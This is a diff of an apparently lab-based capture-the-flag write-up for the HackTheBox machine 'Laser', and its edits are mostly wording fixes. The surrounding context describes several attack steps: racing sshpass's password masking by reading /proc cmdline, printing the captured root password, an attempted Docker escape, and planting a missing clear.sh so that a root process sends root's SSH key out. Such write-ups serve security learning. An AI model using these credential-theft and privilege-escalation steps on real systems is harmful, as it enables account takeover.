@@ -843,7 +843,7 @@ def test():
 test()
 ```
 
-I then created a python client `grpc_client.py` to connect to port 9000 on the server and send my request. Next I created a netcat listener to catch the return message.
+I then created a python client `grpc_client.py` to connect to port 9000 on the server and send my request. I set the feed URL to be my machine to test the connection.  Next I created a netcat listener to catch the return message.
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/laser]
@@ -906,7 +906,7 @@ PING printer.laserinternal.htb (10.10.10.201) 56(84) bytes of data.
 rtt min/avg/max/mdev = 40.902/41.234/41.566/0.332 ms
 ```
 
-I was able to ping the machine, so my connectivity wasn't the problem.
+I was able to ping the machine using that hostname, so my connectivity wasn't the problem.
 
 ### Python port scanner - internal machine
 
@@ -1200,7 +1200,7 @@ solr@laser:/home/solr$ ip a
        valid_lft forever preferred_lft forever
 ```
 
-There seemed to be a docker interface runnng on `172.17.0.1/16`, and potentially a container that looked to be hosted in the `172.18.0.1/16` range.
+There seemed to be a docker interface running on `172.17.0.1/16`, and potentially a container that looked to be hosted in the `172.18.0.1/16` range.
 
 ```text
 solr@laser:~$ ps aux > /dev/shm/ps
@@ -1289,7 +1289,7 @@ I checked for processes running that might give me an indication at what may hav
 sshpass -p zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz scp /opt/updates/files/jenkins-feed root@172.18.0.2:/root/feeds/
 ```
 
-the sshpass program is being used here to pass `root`'s password to SCP in order to move the file `jenkins-feed` to a folder on the docker container.  I opened the manpage for sshpass to see if I could learn any more about how it worked and what it was doing.
+Here, the sshpass program is being used to pass `root`'s password to SCP in order to move the file `jenkins-feed` to a folder on the docker container.  I opened the man page for sshpass to see if I could learn any more about how it worked and what it was doing.
 
 > sshpass is a utility designed for running ssh using the mode referred to as "keyboard-interactive" password authentication, but in non-interactive mode.
 >
@@ -1308,7 +1308,7 @@ the sshpass program is being used here to pass `root`'s password to SCP in order
 >
 >   The  -p  option should be considered the least secure of all of sshpass's options.  **All system users can see the password in the command line with a simple "ps"  command.  Sshpass  makes  a minimal  attempt  to hide the password, but such attempts are doomed to create race conditions without actually solving the problem.** Users of sshpass are encouraged to use one of the  other password passing techniques, which are all more secure.
 
-Essentially it seemed as if this program was written to bypass the security of SSH's "user presence" check when passing plaintext passwords.  From the manpage for `sshpass` I found information that points out that there is a vulnerability in the implementation of the `-p` option.  I tried searching on Google for more information about this race condition, but wasn't able to find anything related to exploiting this.  I decided to look around and see if the source code was available to see if I could determine what this race condition was caused by and if I could exploit it.  
+Essentially it seemed as if this program was written to bypass the security of SSH's "user presence" check when passing plaintext passwords.  From the man page for `sshpass` I found information that points out that there is a vulnerability in the implementation of the `-p` option.  I tried searching on Google for more information about this race condition, but wasn't able to find anything related to exploiting this.  I decided to look around and see if the source code was available to see if I could determine what this race condition was caused by and if I could exploit it.  
 
 I found the code for sshpass on GitHub: [https://github.com/kevinburke/sshpass/blob/master/main.c](https://github.com/kevinburke/sshpass/blob/master/main.c)
 
@@ -1405,7 +1405,7 @@ static int parse_options( int argc, char *argv[] )
 }
 ```
 
-After analyzing the source code, I found out that the `-p` option takes in the original password from argument input and obfuscates it by replacing each character with a 'z', one character at a time. In the `ps aux` output I got earlier I saw the command `sshpass -p zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz` followed by the SCP command the password was being supplied to.
+After analyzing the source code, I found out that the `-p` option takes in the original password from argument input and obfuscates it by replacing each character with a 'z', one character at a time. In the `ps aux` output I got earlier I saw the command `sshpass -p zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz` followed by the SCP command the password was being supplied to.  Since the command is originally input with the password in plaintext, the race condition exists where the plaintext password must be able to be read from memory prior to being obfuscated.
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/laser]
@@ -1435,7 +1435,7 @@ while(1):
             print("")
 ```
 
-I wrote a python script to read the contents of each process in `/procs` and see if they had a `cmdline` file in them. If the file exists then it looked in the data for the word `sshpass` if it found that it would look to see if it also contained multiple 'z' characters, and if not, would print the command line that made that process
+I wrote a python script to read the contents of each process in `/procs` and see if they had a `cmdline` file in them. If the file existed then it looked in the data for the word `sshpass`. Then, if it found that command it would check to see if that process also contained multiple 'z' characters, and if not, would print the command line that made that process.
 
 ```text
 solr@laser:/dev/shm$ python3 get_pass.py
@@ -1445,7 +1445,7 @@ solr@laser:/dev/shm$ python3 get_pass.py
 After waiting for quite some time, I got what I wanted. Cleaning up the output made the command:
 
 ```text
-sshpass -p c413d115b3d87664499624e7826d8c5a scp /opt/updates/files/bug-feed root@172.18.0.2:/root/feeds/
+sshpass -p c413d115b3d87664499624e7826d8c5a scp /opt/updates/files/graphql-feed root@172.18.0.2:/root/feeds/
 ```
 
 The password was `c413d115b3d87664499624e7826d8c5a`.
@@ -1478,14 +1478,14 @@ Last login: Sat Dec 19 13:56:50 2020 from 172.18.0.1
 root@20e3289bc183:~#
 ```
 
-logged in as root to the docker container. Now to try my standard container privesc where I mount the root filesytem into the container
+Using this password and SSH I was able to log in as `root` to the docker container. Next I tried a standard docker container privilege escalation method where I mount the root filesytem into the container.
 
 ```text
 solr@laser:~$ which docker
 /usr/bin/docker
 ```
 
-first I verified that the `docker` program was on the host system
+First I verified that the `docker` program was on the host system \(to copy to the container if need be\).
 
 ```text
 solr@laser:~$ scp /usr/bin/docker root@172.18.0.2:/dev/shm/docker
@@ -1494,7 +1494,7 @@ docker                                                                  0%    0 
 docker                                                                100%   81MB 157.6MB/s   00:00
 ```
 
-next I tried to copied the program to `/dev/shm` folder on the container, but unfortunately there was no space to copy the file
+Next I tried to copied the program to `/dev/shm` folder on the container, but unfortunately there was no space to copy the file.
 
 ```text
 root@20e3289bc183:~# df
@@ -1509,7 +1509,7 @@ tmpfs            1017608       0   1017608   0% /proc/scsi
 tmpfs            1017608       0   1017608   0% /sys/firmware
 ```
 
-verified open space, and noticed it was just running memory space that was full \(`/dev/shm`\)
+I used the `df` command on the container to verify open space, and noticed it was just running memory space that was full \(`/dev/shm`\).
 
 ```text
 solr@laser:~$ scp /usr/bin/docker root@172.18.0.2:/tmp/docker
@@ -1517,22 +1517,31 @@ root@172.18.0.2's password:
 docker
 ```
 
-so I copied the file to /tmp instead
+Since there seemed to be plenty of free space elsewhere in the filesystem I copied the file to `/tmp` instead.
+
+```text
+solr@laser:~$ docker images
+Got permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get http://%2Fvar%2Frun%2Fdocker.sock/v1.40/images/json: dial unix /var/run/docker.sock: connect: permission denied
+```
+
+Unfortunately while trying to use this to escalate privileges I ran into two problems: the service was not running on the container and I couldn't start it because I didn't have privileges to work with containers on the host.
 
 ### clear.sh
+
+I went back to reading some of the output I had gotten from my memory reading script to see if I noticed anything else that was useful.
 
 ```text
 'sshpass\x00-p\x00zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz\x00ssh\x00root@172.18.0.2\x00/tmp/clear.sh\x00'
 ```
 
-While running my python script to find the password \(before I put the check for zzz's\) I noticed another process being run by `sshpass` and was executing a script `clear.sh` in the `/tmp` directory.
+While running my python script to find the password \(before I put the check for zzz's\) I noticed another process being run by `sshpass` that was executing a script `clear.sh` in the `/tmp` directory.  At first I thought it was trying to run the script from the container, but a closer look revealed that there was a separator `\x00` between `root@172.18.0.2` and `/tmp/clear.sh`.  This meant that the command was trying to log in to the container as root, then run the `clear.sh` script from the host's `/tmp` folder.
 
 ```text
 solr@laser:/tmp$ vim /tmp/clear.sh
 solr@laser:/tmp$ chmod +x /tmp/clear.sh
 ```
 
-I checked the `/tmp` directory to see what this script did, but there was no script there.  I made a script to copy `root`'s SSH key to my machine so the script would run it, since the process was running in the context of root \(verified by checking `ps aux` again\).  
+I checked the `/tmp` directory to see what this script did, but there was no script there.  This seemed like a perfect opportunity for me to supply one for them.  I made a script to copy `root`'s SSH key to my machine, since the process was running in the context of root \(verified by checking `ps aux` again\).  
 
 ```bash
 #! /bin/bash
@@ -1706,7 +1715,7 @@ cd /home/solr/feed_engine/src && sudo -u solr /home/solr/feed_engine/src/server.
 service solr start
 ```
 
-In the root directory I also found the scripts that explained how this machine worked
+In the root directory I also found the scripts that explained how this machine worked.
 
 ![](../../.gitbook/assets/0-laser-pwned.png)
 
